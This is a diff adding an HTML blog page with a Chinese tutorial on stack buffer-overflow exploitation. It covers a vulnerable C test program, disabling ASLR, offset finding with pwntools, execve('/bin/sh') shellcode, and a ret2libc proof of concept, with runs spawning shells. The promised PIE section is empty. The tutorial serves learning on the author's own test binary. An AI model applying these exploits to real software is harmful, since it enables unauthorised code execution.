@@ -1,0 +1,161 @@
+
+<!DOCTYPE html>
+<html lang="" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Hexo</title>
+
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="转眼又是一年，想来又老了一岁，看到昨天空间刷的18岁，也确实值得缅怀一下？
+那一年我高三。18岁嘛，少年当头，青春正好，然后我在高三。也就是那一年，跨过了人生中第二道门槛(?),高考。
+听高中老师忽,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link rel="stylesheet" href="/css/diaspora.css">
+
+</head>
+
+<body class="loading">
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">Bypass NX and PIE</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+    <div class="section">
+        <div class="article">
+    <div>
+        <h1 class="title">Bypass NX and PIE</h1>
+        <div class="stuff">
+            <span>六月 24, 2017</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/2017/">2017</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/Blogs/">Blogs</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PWN/">PWN</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>（这篇东西本来好久之前就想写了，但是一直拖来拖去拖到了考试结束。之前一直对ROP不太熟悉，然后系统的学习了一下，发现写着写着就写了好多东西。）</p>
+<a id="more"></a>
+<h1 id="关于-NX-和-PIE"><a href="#关于-NX-和-PIE" class="headerlink" title="关于 NX 和 PIE"></a>关于 NX 和 PIE</h1><h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX，或者说DEP,全称是Data Excution Protection(数据执行保护)，用来防止恶意程序对系统的攻击，如溢出。DEP可以使指定的内存页不具有可执行属性。这样一来，如果指定栈所在的内存页不可执行，那么，当我们要栈上溢出时，我们的Shellcode将难以被执行。</p>
+<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>PIE，或者ALSR，全称是Address space layout randomization。是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。</p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>先贴上测试代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vulnerable_function() &#123;</span><br><span class="line">    char buf[128];</span><br><span class="line">    read(STDIN_FILENO, buf, 256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">    vulnerable_function();</span><br><span class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Control-Flow-Hijack"><a href="#Control-Flow-Hijack" class="headerlink" title="Control Flow Hijack"></a>Control Flow Hijack</h2><p>先对上述程序进行编译，关掉NX和栈溢出保护：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -o test1 test.c</span><br></pre></td></tr></table></figure></p>
+<p>关闭PIE：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -s </span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></p>
+<p>开启core dump：(保证buf的地址在gdb的调试环境中不变)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br><span class="line">sudo sh -c &apos;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&apos;</span><br></pre></td></tr></table></figure></p>
+<p>利用pwntools生成200长度的字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; cyclic(200)</span><br><span class="line">&apos;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&apos;</span><br></pre></td></tr></table></figure></p>
+<p>然后GDB调试我们的<code>test1</code>程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ run</span><br><span class="line">Starting program: /home/processor/test1 </span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xc9 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xffffd4f0 (&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&quot;...)</span><br><span class="line">EDX: 0x100 </span><br><span class="line">ESI: 0xf7fb7000 --&gt; 0x1b1db0 </span><br><span class="line">EDI: 0xf7fb7000 --&gt; 0x1b1db0 </span><br><span class="line">EBP: 0x6261616a (&apos;jaab&apos;)</span><br><span class="line">ESP: 0xffffd580 (&quot;laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\np\373\367\004\334\377&quot;, &lt;incomplete sequence \367&gt;)</span><br><span class="line">EIP: 0x6261616b (&apos;kaab&apos;)</span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x6261616b</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd580 (&quot;laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\np\373\367\004\334\377&quot;, &lt;incomplete sequence \367&gt;)</span><br><span class="line">0004| 0xffffd584 (&quot;maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\np\373\367\004\334\377&quot;, &lt;incomplete sequence \367&gt;)</span><br><span class="line">0008| 0xffffd588 (&quot;naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\np\373\367\004\334\377&quot;, &lt;incomplete sequence \367&gt;)</span><br><span class="line">0012| 0xffffd58c (&quot;oaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\np\373\367\004\334\377&quot;, &lt;incomplete sequence \367&gt;)</span><br><span class="line">0016| 0xffffd590 (&quot;paabqaabraabsaabtaabuaabvaabwaabxaabyaab\np\373\367\004\334\377&quot;, &lt;incomplete sequence \367&gt;)</span><br><span class="line">0020| 0xffffd594 (&quot;qaabraabsaabtaabuaabvaabwaabxaabyaab\np\373\367\004\334\377&quot;, &lt;incomplete sequence \367&gt;)</span><br><span class="line">0024| 0xffffd598 (&quot;raabsaabtaabuaabvaabwaabxaabyaab\np\373\367\004\334\377&quot;, &lt;incomplete sequence \367&gt;)</span><br><span class="line">0028| 0xffffd59c (&quot;saabtaabuaabvaabwaabxaabyaab\np\373\367\004\334\377&quot;, &lt;incomplete sequence \367&gt;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x6261616b in ?? ()</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure></p>
+<p>然后利用pwntools：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; cyclic_find(0x6261616b)</span><br><span class="line">140</span><br></pre></td></tr></table></figure></p>
+<p>第140字节后的4个字节会覆盖read函数的返回地址，然后我们可以扔一个<code>shellcode</code>进去，比如<code>execve (&quot;/bin/sh&quot;)</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># execve (&quot;/bin/sh&quot;) </span><br><span class="line"># xor ecx, ecx</span><br><span class="line"># mul ecx</span><br><span class="line"># push ecx</span><br><span class="line"># push 0x68732f2f   ;; hs//</span><br><span class="line"># push 0x6e69622f   ;; nib/</span><br><span class="line"># mov ebx, esp</span><br><span class="line"># mov al, 11</span><br><span class="line"># int 0x80</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br><span class="line">shellcode += &quot;\x0b\xcd\x80&quot;</span><br></pre></td></tr></table></figure></p>
+<p>因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出buffer的地址为<code>$esp-144</code>。因为我们之前开启了core dump，每次内存出错，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ gdb test1 /tmp/core.1499073189</span><br><span class="line"></span><br><span class="line">Core was generated by `./test1&apos;.</span><br><span class="line">Program terminated with signal SIGILL, Illegal instruction.</span><br><span class="line">#0  0xffffd4f2 in ?? ()</span><br><span class="line">gdb-peda$ x/10s $esp-144</span><br><span class="line">0xffffd510:	&quot;1\311\367\341Qh//shh/bin\211\343\260\v̀&quot;, &apos;a&apos; &lt;repeats 119 times&gt;, &quot;\360\324\377\377\ns\373\367\300\325\377\377&quot;</span><br><span class="line">0xffffd5a9:	&quot;&quot;</span><br><span class="line">0xffffd5aa:	&quot;&quot;</span><br><span class="line">0xffffd5ab:	&quot;&quot;</span><br><span class="line">0xffffd5ac:	&quot;7\326\341&quot;, &lt;incomplete sequence \367&gt;</span><br><span class="line">0xffffd5b1:	&quot;p\373&quot;, &lt;incomplete sequence \367&gt;</span><br><span class="line">0xffffd5b5:	&quot;p\373&quot;, &lt;incomplete sequence \367&gt;</span><br><span class="line">0xffffd5b9:	&quot;&quot;</span><br><span class="line">0xffffd5ba:	&quot;&quot;</span><br><span class="line">0xffffd5bb:	&quot;&quot;</span><br></pre></td></tr></table></figure></p>
+<p>我们得到buffer的起始地址是<code>0xffffd510</code>，所以，poc如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./test1&apos;) </span><br><span class="line"></span><br><span class="line">ret = 0xffffd510</span><br><span class="line"></span><br><span class="line">shellcode = &quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span><br><span class="line">shellcode += &quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span><br><span class="line">shellcode += &quot;\x0b\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">payload = shellcode + &apos;a&apos; * (140 - len(shellcode)) + p32(ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>测试结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python payload.py</span><br><span class="line">[+] Starting local process &apos;./test1&apos;: Done</span><br><span class="line">[!] Disable ptrace_scope to attach to running processes.</span><br><span class="line">    More info: https://askubuntu.com/q/41629</span><br><span class="line">[*] Switching to interactiv</span><br><span class="line">$ whoami</span><br><span class="line">processor</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
+<h2 id="Bypass-NX"><a href="#Bypass-NX" class="headerlink" title="Bypass NX"></a>Bypass NX</h2><p>现在开启NX保护，重新编译test.c：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -o test2 test.c</span><br></pre></td></tr></table></figure></p>
+<p>查看一下test2程序的栈状态：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo cat /proc/47753/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 667644                             /home/processor/test2</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 667644                             /home/processor/test2</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 667644                             /home/processor/test2</span><br><span class="line">f7e05000-f7fb4000 r-xp 00000000 08:01 575786                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7fb4000-f7fb5000 ---p 001af000 08:01 575786                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7fb5000-f7fb7000 r--p 001af000 08:01 575786                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7fb7000-f7fb8000 rw-p 001b1000 08:01 575786                             /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">f7fb8000-f7fbb000 rw-p 00000000 00:00 0 </span><br><span class="line">f7fd4000-f7fd6000 rw-p 00000000 00:00 0 </span><br><span class="line">f7fd6000-f7fd8000 r--p 00000000 00:00 0                                  [vvar]</span><br><span class="line">f7fd8000-f7fd9000 r-xp 00000000 00:00 0                                  [vdso]</span><br><span class="line">f7fd9000-f7ffb000 r-xp 00000000 08:01 575787                             /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">f7ffb000-f7ffc000 rw-p 00000000 00:00 0 </span><br><span class="line">f7ffc000-f7ffd000 r--p 00022000 08:01 575787                             /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">f7ffd000-f7ffe000 rw-p 00023000 08:01 575787                             /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]</span><br></pre></td></tr></table></figure></p>
+<p>可以看到[stack]是<code>rw-p</code>，并没有执行权限，所以我们test1的shellcode便无法执行。<br>我们知道test2调用了libc.so,所以考虑调用<code>system(“/bin/sh”)</code>。</p>
+<p>如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。可以用GDB寻找目标地址(我们首先在main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中，然后我们就可以通过”print system”这个命令来获取system函数在内存中的位置)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ break main</span><br><span class="line">Breakpoint 1 at 0x804846e</span><br><span class="line">gdb-peda$ run</span><br><span class="line">Starting program: /home/processor/test2 </span><br><span class="line"></span><br><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xf7fb8dbc --&gt; 0xffffd0bc --&gt; 0xffffd299 (&quot;CLUTTER_IM_MODULE=xim&quot;)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xffffd020 --&gt; 0x1 </span><br><span class="line">EDX: 0xffffd044 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb7000 --&gt; 0x1b1db0 </span><br><span class="line">EDI: 0xf7fb7000 --&gt; 0x1b1db0 </span><br><span class="line">EBP: 0xffffd008 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd004 --&gt; 0xffffd020 --&gt; 0x1 </span><br><span class="line">EIP: 0x804846e (&lt;main+14&gt;:	sub    esp,0x4)</span><br><span class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x804846a &lt;main+10&gt;:	push   ebp</span><br><span class="line">   0x804846b &lt;main+11&gt;:	mov    ebp,esp</span><br><span class="line">   0x804846d &lt;main+13&gt;:	push   ecx</span><br><span class="line">=&gt; 0x804846e &lt;main+14&gt;:	sub    esp,0x4</span><br><span class="line">   0x8048471 &lt;main+17&gt;:	call   0x804843b &lt;vulnerable_function&gt;</span><br><span class="line">   0x8048476 &lt;main+22&gt;:	sub    esp,0x4</span><br><span class="line">   0x8048479 &lt;main+25&gt;:	push   0xd</span><br><span class="line">   0x804847b &lt;main+27&gt;:	push   0x8048520</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd004 --&gt; 0xffffd020 --&gt; 0x1 </span><br><span class="line">0004| 0xffffd008 --&gt; 0x0 </span><br><span class="line">0008| 0xffffd00c --&gt; 0xf7e1d637 (&lt;__libc_start_main+247&gt;:	add    esp,0x10)</span><br><span class="line">0012| 0xffffd010 --&gt; 0xf7fb7000 --&gt; 0x1b1db0 </span><br><span class="line">0016| 0xffffd014 --&gt; 0xf7fb7000 --&gt; 0x1b1db0 </span><br><span class="line">0020| 0xffffd018 --&gt; 0x0 </span><br><span class="line">0024| 0xffffd01c --&gt; 0xf7e1d637 (&lt;__libc_start_main+247&gt;:	add    esp,0x10)</span><br><span class="line">0028| 0xffffd020 --&gt; 0x1 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804846e in main ()</span><br><span class="line">gdb-peda$ print system</span><br><span class="line">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0xf7e3fda0 &lt;system&gt;</span><br><span class="line">gdb-peda$ find &quot;/bin/sh&quot;</span><br><span class="line">Searching for &apos;/bin/sh&apos; in: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">libc : 0xf7f6082b (&quot;/bin/sh&quot;)</span><br><span class="line">gdb-peda$ x/s 0xf7f6082b</span><br><span class="line">0xf7f6082b:	&quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure></p>
+<p>所以，可以写poc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./test2&apos;)</span><br><span class="line"></span><br><span class="line">ret = 0xdeadbeef</span><br><span class="line">system_addr=0xf7e3fda0</span><br><span class="line">binsh_addr=0xf7f6082b</span><br><span class="line"></span><br><span class="line">payload =  &apos;a&apos;*140 + p32(system_addr) + p32(ret) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>测试结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python payload.py</span><br><span class="line">[+] Starting local process &apos;./test2&apos;: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">processor</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
+<h2 id="Bypass-NX-and-PIE"><a href="#Bypass-NX-and-PIE" class="headerlink" title="Bypass NX and PIE"></a>Bypass NX and PIE</h2>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="http://link.hhtjim.com/163/425570952.mp3">
+            </audio>
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+</body>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-69833742-2', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+</html>
